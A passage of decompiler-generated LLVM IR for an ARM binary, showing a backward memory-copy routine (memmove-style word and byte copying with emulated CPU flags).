  store i1 %v7_15b14, i1* %cpsr_n.global-to-local, align 1
  %v8_15b14 = icmp eq i32 %v2_15b14, 0
  store i1 %v8_15b14, i1* %cpsr_z.global-to-local, align 1
  %v5_15b18 = icmp slt i32 %v2_15b08, -12
  br i1 %v5_15b18, label %dec_label_pc_15b34, label %dec_label_pc_15b1c

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b10, %dec_label_pc_15ad0, %dec_label_pc_15b1c
  %v1_15b28 = phi i32 [ %v4_15b28, %dec_label_pc_15b1c ], [ %v12_15b04, %dec_label_pc_15b10 ], [ %v0_15a2c74, %dec_label_pc_15ad0 ]
  %v0_15b1c = load i32, i32* @lr, align 4
  %v3_15b1c = udiv i32 %v0_15b1c, 16777216
  store i32 %v3_15b1c, i32* %ip.global-to-local, align 4
  %v0_15b20 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b20 = inttoptr i32 %v0_15b20 to i32*
  %v2_15b20 = load i32, i32* %v1_15b20, align 4
  store i32 %v2_15b20, i32* @lr, align 4
  %v4_15b20 = add i32 %v0_15b20, 4
  store i32 %v4_15b20, i32* %r1.global-to-local, align 4
  %v4_15b24 = mul i32 %v2_15b20, 256
  %v5_15b24 = or i32 %v4_15b24, %v3_15b1c
  store i32 %v5_15b24, i32* @ip, align 4
  %v2_15b28 = inttoptr i32 %v1_15b28 to i32*
  store i32 %v5_15b24, i32* %v2_15b28, align 4
  %v3_15b28 = load i32, i32* @r0, align 4
  %v4_15b28 = add i32 %v3_15b28, 4
  store i32 %v4_15b28, i32* @r0, align 4
  %v0_15b2c = load i32, i32* %r2.global-to-local, align 4
  %v2_15b2c = add i32 %v0_15b2c, -4
  store i32 %v2_15b2c, i32* %r2.global-to-local, align 4
  %v6_15b30 = icmp slt i32 %v0_15b2c, 4
  br i1 %v6_15b30, label %dec_label_pc_15b34.loopexit, label %dec_label_pc_15b1c

dec_label_pc_15b34.loopexit:                      ; preds = %dec_label_pc_15b1c
  %v4_15b2c = sub i32 3, %v0_15b2c
  %v5_15b2c = and i32 %v4_15b2c, %v0_15b2c
  %v6_15b2c = icmp slt i32 %v5_15b2c, 0
  %v7_15b2c = icmp slt i32 %v2_15b2c, 0
  store i1 %v6_15b2c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b2c, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b34.loopexit, %dec_label_pc_15b10
  %v2_1599c113 = phi i32 [ %v4_15b28, %dec_label_pc_15b34.loopexit ], [ %v12_15b04, %dec_label_pc_15b10 ]
  %v0_1598c109 = phi i32 [ %v2_15b2c, %dec_label_pc_15b34.loopexit ], [ %v2_15b14, %dec_label_pc_15b10 ]
  %v0_15b34 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b34 = add i32 %v0_15b34, -1
  store i32 %v1_15b34, i32* @r1, align 4
  br label %bb131

dec_label_pc_15b3c:                               ; preds = %dec_label_pc_158f0
  %v1_15b3c = load i32, i32* @r2, align 4
  %v2_15b3c = add i32 %v1_15b3c, %v0_158f0
  store i32 %v2_15b3c, i32* %r1.global-to-local, align 4
  %v2_15b40 = add i32 %v1_15b3c, %v1_158f0
  store i32 %v2_15b40, i32* %r0.global-to-local, align 4
  %v2_15b44 = add i32 %v1_15b3c, -4
  store i32 %v2_15b44, i32* %r2.global-to-local, align 4
  %v4_15b44 = sub i32 3, %v1_15b3c
  %v5_15b44 = and i32 %v4_15b44, %v1_15b3c
  %v6_15b44 = icmp slt i32 %v5_15b44, 0
  store i1 %v6_15b44, i1* %cpsr_v.global-to-local, align 1
  %v7_15b44 = icmp slt i32 %v2_15b44, 0
  store i1 %v7_15b44, i1* %cpsr_n.global-to-local, align 1
  %v8_15b44 = icmp eq i32 %v1_15b3c, 4
  store i1 %v8_15b44, i1* %cpsr_z.global-to-local, align 1
  %v5_15b48 = icmp slt i32 %v1_15b3c, 4
  br i1 %v5_15b48, label %bb141, label %dec_label_pc_15b4c

dec_label_pc_15b4c:                               ; preds = %dec_label_pc_15b3c
  %v1_15b4c = urem i32 %v2_15b40, 4
  store i32 %v1_15b4c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b4c = icmp eq i32 %v1_15b4c, 0
  store i1 %v2_15b4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b4c, label %dec_label_pc_15b54, label %dec_label_pc_15bf4

dec_label_pc_15b54:                               ; preds = %dec_label_pc_15b4c
  %v1_15b54 = urem i32 %v2_15b3c, 4
  store i32 %v1_15b54, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b54 = icmp eq i32 %v1_15b54, 0
  store i1 %v2_15b54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b54, label %dec_label_pc_15b5c, label %dec_label_pc_15c20

dec_label_pc_15b5c:                               ; preds = %dec_label_pc_15b54, %dec_label_pc_15c18
  %v0_15b7448 = phi i32 [ %v2_15b40, %dec_label_pc_15b54 ], [ %v0_15c6831, %dec_label_pc_15c18 ]
  %v0_15b7047 = phi i32 [ %v2_15b3c, %dec_label_pc_15b54 ], [ %v0_15c18, %dec_label_pc_15c18 ]
  %v0_15b5c = phi i32 [ %v2_15b44, %dec_label_pc_15b54 ], [ %v2_15c10, %dec_label_pc_15c18 ]
  %v2_15b5c = add i32 %v0_15b5c, -8
  store i32 %v2_15b5c, i32* %r2.global-to-local, align 4
  %v4_15b5c = sub i32 7, %v0_15b5c
  %v5_15b5c = and i32 %v4_15b5c, %v0_15b5c
  %v6_15b5c = icmp slt i32 %v5_15b5c, 0
  store i1 %v6_15b5c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b5c = icmp slt i32 %v2_15b5c, 0
  store i1 %v7_15b5c, i1* %cpsr_n.global-to-local, align 1
  %v8_15b5c = icmp eq i32 %v0_15b5c, 8
  store i1 %v8_15b5c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b60 = icmp slt i32 %v0_15b5c, 8
  br i1 %v5_15b60, label %dec_label_pc_15bac, label %dec_label_pc_15b64

dec_label_pc_15b64:                               ; preds = %dec_label_pc_15b5c
  %v3_15b64 = load i32, i32* @r4, align 4
  store i32 %v3_15b64, i32* %stack_var_-8, align 4
  %v6_15b64 = load i32, i32* @lr, align 4
  %v2_15b68 = add i32 %v0_15b5c, -28
  store i32 %v2_15b68, i32* %r2.global-to-local, align 4
  %v4_15b68 = sub i32 27, %v0_15b5c
  %v5_15b68 = and i32 %v4_15b68, %v2_15b5c
  %v6_15b68 = icmp slt i32 %v5_15b68, 0
  store i1 %v6_15b68, i1* %cpsr_v.global-to-local, align 1
  %v7_15b68 = icmp slt i32 %v2_15b68, 0
  store i1 %v7_15b68, i1* %cpsr_n.global-to-local, align 1
  %v8_15b68 = icmp eq i32 %v2_15b5c, 20
  store i1 %v8_15b68, i1* %cpsr_z.global-to-local, align 1
  %v5_15b6c = icmp slt i32 %v2_15b5c, 20
  br i1 %v5_15b6c, label %dec_label_pc_15b88, label %dec_label_pc_15b70

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15b64, %dec_label_pc_15b70.dec_label_pc_15b70_crit_edge
  %v0_15b74 = phi i32 [ %v1_15b7c, %dec_label_pc_15b70.dec_label_pc_15b70_crit_edge ], [ %v0_15b7448, %dec_label_pc_15b64 ]
  %v0_15b70 = phi i32 [ %v0_15b70.pre, %dec_label_pc_15b70.dec_label_pc_15b70_crit_edge ], [ %v0_15b7047, %dec_label_pc_15b64 ]
  %v1_15b70 = add i32 %v0_15b70, -4
  %v2_15b70 = inttoptr i32 %v1_15b70 to i32*
  %v3_15b70 = load i32, i32* %v2_15b70, align 4
  store i32 %v3_15b70, i32* %r3.global-to-local, align 4
  %v4_15b70 = add i32 %v0_15b70, -8
  %v5_15b70 = inttoptr i32 %v4_15b70 to i32*
  %v6_15b70 = load i32, i32* %v5_15b70, align 4
  store i32 %v6_15b70, i32* %r4.global-to-local, align 4
  %v7_15b70 = add i32 %v0_15b70, -12
  %v8_15b70 = inttoptr i32 %v7_15b70 to i32*
  %v9_15b70 = load i32, i32* %v8_15b70, align 4
  store i32 %v9_15b70, i32* %ip.global-to-local, align 4
  %v10_15b70 = add i32 %v0_15b70, -16
  %v11_15b70 = inttoptr i32 %v10_15b70 to i32*
  %v12_15b70 = load i32, i32* %v11_15b70, align 4
  store i32 %v12_15b70, i32* %lr.global-to-local, align 4
  store i32 %v10_15b70, i32* %r1.global-to-local, align 4
  %v1_15b74 = add i32 %v0_15b74, -16
  %v2_15b74 = inttoptr i32 %v1_15b74 to i32*
  store i32 %v3_15b70, i32* %v2_15b74, align 4
  %v4_15b74 = add i32 %v0_15b74, -12
  %v5_15b74 = inttoptr i32 %v4_15b74 to i32*
  %v6_15b74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15b74, i32* %v5_15b74, align 4
  %v7_15b74 = add i32 %v0_15b74, -8
  %v8_15b74 = inttoptr i32 %v7_15b74 to i32*
  %v9_15b74 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15b74, i32* %v8_15b74, align 4
  %v10_15b74 = add i32 %v0_15b74, -4
  %v11_15b74 = inttoptr i32 %v10_15b74 to i32*
  %v12_15b74 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b74, i32* %v11_15b74, align 4
  store i32 %v1_15b74, i32* %r0.global-to-local, align 4
  %v0_15b78 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b78 = add i32 %v0_15b78, -4
  %v2_15b78 = inttoptr i32 %v1_15b78 to i32*
  %v3_15b78 = load i32, i32* %v2_15b78, align 4
  store i32 %v3_15b78, i32* %r3.global-to-local, align 4
  %v4_15b78 = add i32 %v0_15b78, -8
  %v5_15b78 = inttoptr i32 %v4_15b78 to i32*
  %v6_15b78 = load i32, i32* %v5_15b78, align 4
  store i32 %v6_15b78, i32* %r4.global-to-local, align 4
  %v7_15b78 = add i32 %v0_15b78, -12
  %v8_15b78 = inttoptr i32 %v7_15b78 to i32*
  %v9_15b78 = load i32, i32* %v8_15b78, align 4
  store i32 %v9_15b78, i32* @ip, align 4
  %v10_15b78 = add i32 %v0_15b78, -16
  %v11_15b78 = inttoptr i32 %v10_15b78 to i32*
  %v12_15b78 = load i32, i32* %v11_15b78, align 4
  store i32 %v12_15b78, i32* %lr.global-to-local, align 4
  store i32 %v10_15b78, i32* %r1.global-to-local, align 4
  %v1_15b7c = add i32 %v0_15b74, -32
  %v2_15b7c = inttoptr i32 %v1_15b7c to i32*
  store i32 %v3_15b78, i32* %v2_15b7c, align 4
  %v4_15b7c = add i32 %v0_15b74, -28
  %v5_15b7c = inttoptr i32 %v4_15b7c to i32*
  %v6_15b7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15b7c, i32* %v5_15b7c, align 4
  %v7_15b7c = add i32 %v0_15b74, -24
  %v8_15b7c = inttoptr i32 %v7_15b7c to i32*
  %v9_15b7c = load i32, i32* @ip, align 4
  store i32 %v9_15b7c, i32* %v8_15b7c, align 4
  %v10_15b7c = add i32 %v0_15b74, -20
  %v11_15b7c = inttoptr i32 %v10_15b7c to i32*
  %v12_15b7c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b7c, i32* %v11_15b7c, align 4
  store i32 %v1_15b7c, i32* %r0.global-to-local, align 4
  %v0_15b80 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b80 = add i32 %v0_15b80, -32
  store i32 %v2_15b80, i32* %r2.global-to-local, align 4
  %v6_15b84 = icmp slt i32 %v0_15b80, 32
  br i1 %v6_15b84, label %dec_label_pc_15b88.loopexit, label %dec_label_pc_15b70.dec_label_pc_15b70_crit_edge

dec_label_pc_15b70.dec_label_pc_15b70_crit_edge:  ; preds = %dec_label_pc_15b70
  %v0_15b70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b70

dec_label_pc_15b88.loopexit:                      ; preds = %dec_label_pc_15b70
  %v4_15b80 = sub i32 31, %v0_15b80
  %v5_15b80 = and i32 %v4_15b80, %v0_15b80
  %v6_15b80 = icmp slt i32 %v5_15b80, 0
  %v7_15b80 = icmp slt i32 %v2_15b80, 0
  store i1 %v6_15b80, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b80, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b88

dec_label_pc_15b88:                               ; preds = %dec_label_pc_15b88.loopexit, %dec_label_pc_15b64
  %v6_15b90 = phi i32 [ %v1_15b7c, %dec_label_pc_15b88.loopexit ], [ %v0_15b7448, %dec_label_pc_15b64 ]
  %v0_15b98.pr = phi i32 [ %v2_15b80, %dec_label_pc_15b88.loopexit ], [ %v2_15b68, %dec_label_pc_15b64 ]
  %v4_15b88 = add i32 %v0_15b98.pr, 16
  %v6_15b88 = sub i32 0, %v0_15b98.pr
  %v7_15b88 = and i32 %v4_15b88, %v6_15b88
  %v8_15b88 = icmp slt i32 %v7_15b88, 0
  store i1 %v8_15b88, i1* %cpsr_v.global-to-local, align 1
  %v9_15b88 = icmp slt i32 %v4_15b88, 0
  store i1 %v9_15b88, i1* %cpsr_n.global-to-local, align 1
  %v10_15b88 = icmp eq i32 %v4_15b88, 0
  store i1 %v10_15b88, i1* %cpsr_z.global-to-local, align 1
  %v5_15b8c = icmp slt i32 %v0_15b98.pr, -16
  br i1 %v5_15b8c, label %.thread13, label %bb138

bb138:                                            ; preds = %dec_label_pc_15b88
  %v6_15b8c = load i32, i32* %r1.global-to-local, align 4
  %v7_15b8c = add i32 %v6_15b8c, -4
  %v8_15b8c = inttoptr i32 %v7_15b8c to i32*
  %v9_15b8c = load i32, i32* %v8_15b8c, align 4
  store i32 %v9_15b8c, i32* %r3.global-to-local, align 4
  %v10_15b8c = add i32 %v6_15b8c, -8
  %v11_15b8c = inttoptr i32 %v10_15b8c to i32*
  %v12_15b8c = load i32, i32* %v11_15b8c, align 4
  store i32 %v12_15b8c, i32* %r4.global-to-local, align 4
  %v13_15b8c = add i32 %v6_15b8c, -12
  %v14_15b8c = inttoptr i32 %v13_15b8c to i32*
  %v15_15b8c = load i32, i32* %v14_15b8c, align 4
  store i32 %v15_15b8c, i32* @ip, align 4
  %v16_15b8c = add i32 %v6_15b8c, -16
  %v17_15b8c = inttoptr i32 %v16_15b8c to i32*
  %v18_15b8c = load i32, i32* %v17_15b8c, align 4
  store i32 %v18_15b8c, i32* %lr.global-to-local, align 4
  store i32 %v16_15b8c, i32* %r1.global-to-local, align 4
  %v7_15b90 = add i32 %v6_15b90, -16
  %v8_15b90 = inttoptr i32 %v7_15b90 to i32*
  store i32 %v9_15b8c, i32* %v8_15b90, align 4
  %v10_15b90 = add i32 %v6_15b90, -12
  %v11_15b90 = inttoptr i32 %v10_15b90 to i32*
  %v12_15b90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15b90, i32* %v11_15b90, align 4
  %v13_15b90 = add i32 %v6_15b90, -8
  %v14_15b90 = inttoptr i32 %v13_15b90 to i32*
  %v15_15b90 = load i32, i32* @ip, align 4
  store i32 %v15_15b90, i32* %v14_15b90, align 4
  %v16_15b90 = add i32 %v6_15b90, -4
  %v17_15b90 = inttoptr i32 %v16_15b90 to i32*
  %v18_15b90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15b90, i32* %v17_15b90, align 4
  store i32 %v7_15b90, i32* %r0.global-to-local, align 4
  %v6_15b94 = load i32, i32* %r2.global-to-local, align 4
  %v7_15b94 = add i32 %v6_15b94, -16
  store i32 %v7_15b94, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_15b88, %bb138
  %v6_15ba0 = phi i32 [ %v7_15b90, %bb138 ], [ %v6_15b90, %dec_label_pc_15b88 ]
  %v0_15b98 = phi i32 [ %v7_15b94, %bb138 ], [ %v0_15b98.pr, %dec_label_pc_15b88 ]
  %v4_15b98 = add i32 %v0_15b98, 20
  store i32 %v4_15b98, i32* %r2.global-to-local, align 4
  %v6_15b98 = sub i32 0, %v0_15b98
  %v7_15b98 = and i32 %v4_15b98, %v6_15b98
  %v8_15b98 = icmp slt i32 %v7_15b98, 0
  store i1 %v8_15b98, i1* %cpsr_v.global-to-local, align 1
  %v9_15b98 = icmp slt i32 %v4_15b98, 0
  store i1 %v9_15b98, i1* %cpsr_n.global-to-local, align 1
  %v10_15b98 = icmp eq i32 %v4_15b98, 0
  store i1 %v10_15b98, i1* %cpsr_z.global-to-local, align 1
  %v5_15b9c = icmp slt i32 %v0_15b98, -20
  br i1 %v5_15b9c, label %.thread15, label %bb139

bb139:                                            ; preds = %.thread13
  %v6_15b9c = load i32, i32* %r1.global-to-local, align 4
  %v7_15b9c = add i32 %v6_15b9c, -4
  %v8_15b9c = inttoptr i32 %v7_15b9c to i32*
  %v9_15b9c = load i32, i32* %v8_15b9c, align 4
  store i32 %v9_15b9c, i32* %r3.global-to-local, align 4
  %v10_15b9c = add i32 %v6_15b9c, -8
  %v11_15b9c = inttoptr i32 %v10_15b9c to i32*
  %v12_15b9c = load i32, i32* %v11_15b9c, align 4
  store i32 %v12_15b9c, i32* @ip, align 4
  %v13_15b9c = add i32 %v6_15b9c, -12
  %v14_15b9c = inttoptr i32 %v13_15b9c to i32*
  %v15_15b9c = load i32, i32* %v14_15b9c, align 4
  store i32 %v15_15b9c, i32* %lr.global-to-local, align 4
  store i32 %v13_15b9c, i32* %r1.global-to-local, align 4
  %v7_15ba0 = add i32 %v6_15ba0, -12
  %v8_15ba0 = inttoptr i32 %v7_15ba0 to i32*
  store i32 %v9_15b9c, i32* %v8_15ba0, align 4
  %v10_15ba0 = add i32 %v6_15ba0, -8
  %v11_15ba0 = inttoptr i32 %v10_15ba0 to i32*
  %v12_15ba0 = load i32, i32* @ip, align 4
  store i32 %v12_15ba0, i32* %v11_15ba0, align 4
  %v13_15ba0 = add i32 %v6_15ba0, -4
  %v14_15ba0 = inttoptr i32 %v13_15ba0 to i32*
  %v15_15ba0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15ba0, i32* %v14_15ba0, align 4
  store i32 %v7_15ba0, i32* %r0.global-to-local, align 4
  %v6_15ba4 = load i32, i32* %r2.global-to-local, align 4
  %v7_15ba4 = add i32 %v6_15ba4, -12
  store i32 %v7_15ba4, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb139
  %v6_15bc456 = phi i32 [ %v6_15ba0, %.thread13 ], [ %v7_15ba0, %bb139 ]
  %v0_15bac54 = phi i32 [ %v4_15b98, %.thread13 ], [ %v7_15ba4, %bb139 ]
  %v2_15ba8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15ba8, i32* @r4, align 4
  store i32 %v6_15b64, i32* @lr, align 4
  br label %dec_label_pc_15bac

dec_label_pc_15bac:                               ; preds = %dec_label_pc_15b5c, %.thread15
  %v7_15bbc = phi i32 [ %v0_15b7448, %dec_label_pc_15b5c ], [ %v6_15bc456, %.thread15 ]
  %v0_15bac = phi i32 [ %v2_15b5c, %dec_label_pc_15b5c ], [ %v0_15bac54, %.thread15 ]
  %v2_15bac = add i32 %v0_15bac, 8
  store i32 %v2_15bac, i32* %r2.global-to-local, align 4
  %v4_15bac = sub i32 0, %v0_15bac
  %v5_15bac = and i32 %v2_15bac, %v4_15bac
  %v6_15bac = icmp slt i32 %v5_15bac, 0
  store i1 %v6_15bac, i1* %cpsr_v.global-to-local, align 1
  %v7_15bac = icmp slt i32 %v2_15bac, 0
  store i1 %v7_15bac, i1* %cpsr_n.global-to-local, align 1
  %v8_15bac = icmp eq i32 %v2_15bac, 0
  store i1 %v8_15bac, i1* %cpsr_z.global-to-local, align 1
  %v5_15bb0 = icmp slt i32 %v0_15bac, -8
  br i1 %v5_15bb0, label %bb141, label %dec_label_pc_15bb4

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15bac
  %v6_15bb4 = add i32 %v0_15bac, 4
  store i32 %v6_15bb4, i32* %r2.global-to-local, align 4
  %v8_15bb4 = sub i32 -5, %v0_15bac
  %v9_15bb4 = and i32 %v8_15bb4, %v2_15bac
  %v10_15bb4 = icmp slt i32 %v9_15bb4, 0
  store i1 %v10_15bb4, i1* %cpsr_v.global-to-local, align 1
  %v11_15bb4 = icmp slt i32 %v6_15bb4, 0
  store i1 %v11_15bb4, i1* %cpsr_n.global-to-local, align 1
  %v12_15bb4 = icmp eq i32 %v2_15bac, 4
  store i1 %v12_15bb4, i1* %cpsr_z.global-to-local, align 1
  %v5_15bb8 = icmp slt i32 %v2_15bac, 4
  %v6_15bb8 = load i32, i32* %r1.global-to-local, align 4
  %v7_15bb8 = add i32 %v6_15bb8, -4
  %v8_15bb8 = inttoptr i32 %v7_15bb8 to i32*
  %v9_15bb8 = load i32, i32* %v8_15bb8, align 4
  store i32 %v9_15bb8, i32* %r3.global-to-local, align 4
  br i1 %v5_15bb8, label %.thread19, label %bb140

.thread19:                                        ; preds = %dec_label_pc_15bb4
  store i32 %v7_15bb8, i32* %r1.global-to-local, align 4
  %v8_15bbc = add i32 %v7_15bbc, -4
  %v9_15bbc = inttoptr i32 %v8_15bbc to i32*
  store i32 %v9_15bb8, i32* %v9_15bbc, align 4
  %v10_15bbc = load i32, i32* %r0.global-to-local, align 4
  %v11_15bbc = add i32 %v10_15bbc, -4
  store i32 %v11_15bbc, i32* %r0.global-to-local, align 4
  %v0_15bcc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_15bb4
  %v10_15bc0 = add i32 %v6_15bb8, -8
  %v11_15bc0 = inttoptr i32 %v10_15bc0 to i32*
  %v12_15bc0 = load i32, i32* %v11_15bc0, align 4
  store i32 %v12_15bc0, i32* @ip, align 4
  store i32 %v10_15bc0, i32* %r1.global-to-local, align 4
  %v7_15bc4 = add i32 %v7_15bbc, -8
  %v8_15bc4 = inttoptr i32 %v7_15bc4 to i32*
  store i32 %v9_15bb8, i32* %v8_15bc4, align 4
  %v10_15bc4 = add i32 %v7_15bbc, -4
  %v11_15bc4 = inttoptr i32 %v10_15bc4 to i32*
  %v12_15bc4 = load i32, i32* @ip, align 4
  store i32 %v12_15bc4, i32* %v11_15bc4, align 4
  store i32 %v7_15bc4, i32* %r0.global-to-local, align 4
  %v6_15bc8 = load i32, i32* %r2.global-to-local, align 4
  %v7_15bc8 = add i32 %v6_15bc8, -4
  store i32 %v7_15bc8, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_15b3c, %dec_label_pc_15bac, %dec_label_pc_15d70, %dec_label_pc_15d04, %dec_label_pc_15c98, %bb140
  %v2_15bd0 = phi i32 [ %v11_15bbc, %.thread19 ], [ %v0_15c6831, %.thread25 ], [ %v2_15b40, %dec_label_pc_15b3c ], [ %v7_15bbc, %dec_label_pc_15bac ], [ %v2_15bdc64, %dec_label_pc_15d70 ], [ %v2_15bdc63, %dec_label_pc_15d04 ], [ %v2_15bdc62, %dec_label_pc_15c98 ], [ %v7_15bc4, %bb140 ]
  %v0_15bcc = phi i32 [ %v0_15bcc.pre, %.thread19 ], [ %v2_15c10, %.thread25 ], [ %v2_15b44, %dec_label_pc_15b3c ], [ %v2_15bac, %dec_label_pc_15bac ], [ %v0_15bcc60, %dec_label_pc_15d70 ], [ %v0_15bcc59, %dec_label_pc_15d04 ], [ %v0_15bcc58, %dec_label_pc_15c98 ], [ %v7_15bc8, %bb140 ]
  %v1_15bcc = add i32 %v0_15bcc, 4
  store i32 %v1_15bcc, i32* %r2.global-to-local, align 4
  %v3_15bcc = sub i32 0, %v0_15bcc
  %v4_15bcc = and i32 %v1_15bcc, %v3_15bcc
  %v5_15bcc = icmp slt i32 %v4_15bcc, 0
  store i1 %v5_15bcc, i1* %cpsr_v.global-to-local, align 1
  %v6_15bcc = icmp slt i32 %v1_15bcc, 0
  store i1 %v6_15bcc, i1* %cpsr_n.global-to-local, align 1
  %v7_15bcc = icmp eq i32 %v1_15bcc, 0
  store i1 %v7_15bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15bcc, label %.thread122, label %bb142

bb142:                                            ; preds = %bb141
  %v1_15bd4 = add i32 %v0_15bcc, 2
  %v3_15bd4 = sub i32 -3, %v0_15bcc
  %v4_15bd4 = and i32 %v3_15bd4, %v1_15bcc
  %v5_15bd4 = icmp slt i32 %v4_15bd4, 0
  store i1 %v5_15bd4, i1* %cpsr_v.global-to-local, align 1
  %v6_15bd4 = icmp slt i32 %v1_15bd4, 0
  store i1 %v6_15bd4, i1* %cpsr_n.global-to-local, align 1
  %v7_15bd4 = icmp eq i32 %v1_15bcc, 2
  store i1 %v7_15bd4, i1* %cpsr_z.global-to-local, align 1
  %v0_15bd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15bd8 = add i32 %v0_15bd8, -1
  %v2_15bd8 = inttoptr i32 %v1_15bd8 to i8*
  %v3_15bd8 = load i8, i8* %v2_15bd8, align 1
  %v4_15bd8 = zext i8 %v3_15bd8 to i32
  store i32 %v4_15bd8, i32* %r3.global-to-local, align 4
  store i32 %v1_15bd8, i32* %r1.global-to-local, align 4
  %v3_15bdc = add i32 %v2_15bd0, -1
  %v4_15bdc = inttoptr i32 %v3_15bdc to i8*
  store i8 %v3_15bd8, i8* %v4_15bdc, align 1
  %v5_15bdc = load i32, i32* %r0.global-to-local, align 4
  %v6_15bdc = add i32 %v5_15bdc, -1
  store i32 %v6_15bdc, i32* %r0.global-to-local, align 4
  %v0_15be0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15be0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15be0 = xor i1 %v0_15be0, %v1_15be0
  br i1 %v2_15be0, label %.thread121, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15be0 = load i32, i32* %r1.global-to-local, align 4
  %v4_15be0 = add i32 %v3_15be0, -1
  %v5_15be0 = inttoptr i32 %v4_15be0 to i8*
  %v6_15be0 = load i8, i8* %v5_15be0, align 1
  %v7_15be0 = zext i8 %v6_15be0 to i32
  store i32 %v7_15be0, i32* %r3.global-to-local, align 4
  store i32 %v4_15be0, i32* %r1.global-to-local, align 4
  %v6_15be4 = add i32 %v5_15bdc, -2
  %v7_15be4 = inttoptr i32 %v6_15be4 to i8*
  store i8 %v6_15be0, i8* %v7_15be4, align 1
  %v8_15be4 = load i32, i32* %r0.global-to-local, align 4
  %v9_15be4 = add i32 %v8_15be4, -1
  store i32 %v9_15be4, i32* %r0.global-to-local, align 4
  %v1_15be8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15be8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb142, %bb143
  %v7_15bec = phi i32 [ %v9_15be4, %bb143 ], [ %v6_15bdc, %bb142 ]
  %v2_15bec = phi i1 [ %v2_15be8.pre, %bb143 ], [ %v1_15be0, %bb142 ]
  %v1_15bec = phi i1 [ %v1_15be8.pre, %bb143 ], [ %v0_15be0, %bb142 ]
  %v0_15be8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15be8 = xor i1 %v2_15bec, %v1_15bec
  %v4_15be8 = or i1 %v0_15be8, %v3_15be8
  br i1 %v4_15be8, label %.thread122, label %bb144

bb144:                                            ; preds = %.thread121
  %v5_15be8 = load i32, i32* %r1.global-to-local, align 4
  %v6_15be8 = add i32 %v5_15be8, -1
  %v7_15be8 = inttoptr i32 %v6_15be8 to i8*
  %v8_15be8 = load i8, i8* %v7_15be8, align 1
  %v9_15be8 = zext i8 %v8_15be8 to i32
  store i32 %v9_15be8, i32* %r3.global-to-local, align 4
  store i32 %v6_15be8, i32* %r1.global-to-local, align 4
  %v8_15bec = add i32 %v7_15bec, -1
  %v9_15bec = inttoptr i32 %v8_15bec to i8*
  store i8 %v8_15be8, i8* %v9_15bec, align 1
  %v10_15bec = load i32, i32* %r0.global-to-local, align 4
  %v11_15bec = add i32 %v10_15bec, -1
  store i32 %v11_15bec, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_15bf4:                               ; preds = %dec_label_pc_15b4c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15bf4 = icmp eq i32 %v1_15b4c, 1
  store i1 %v8_15bf4, i1* %cpsr_n.global-to-local, align 1
  %v9_15bf4 = icmp eq i32 %v1_15b4c, 2
  store i1 %v9_15bf4, i1* %cpsr_z.global-to-local, align 1
  %v1_15bf8 = add i32 %v2_15b3c, -1
  %v2_15bf8 = inttoptr i32 %v1_15bf8 to i8*
  %v3_15bf8 = load i8, i8* %v2_15bf8, align 1
  %v4_15bf8 = zext i8 %v3_15bf8 to i32
  store i32 %v4_15bf8, i32* %r3.global-to-local, align 4
  store i32 %v1_15bf8, i32* %r1.global-to-local, align 4
  %v3_15bfc = add i32 %v2_15b40, -1
  %v4_15bfc = inttoptr i32 %v3_15bfc to i8*
  store i8 %v3_15bf8, i8* %v4_15bfc, align 1
  %v5_15bfc = load i32, i32* %r0.global-to-local, align 4
  %v6_15bfc = add i32 %v5_15bfc, -1
  store i32 %v6_15bfc, i32* %r0.global-to-local, align 4
  br i1 %v8_15bf4, label %.thread25, label %bb145

bb145:                                            ; preds = %dec_label_pc_15bf4
  %v6_15c00 = load i32, i32* %r1.global-to-local, align 4
  %v7_15c00 = add i32 %v6_15c00, -1
  %v8_15c00 = inttoptr i32 %v7_15c00 to i8*
  %v9_15c00 = load i8, i8* %v8_15c00, align 1
  %v10_15c00 = zext i8 %v9_15c00 to i32
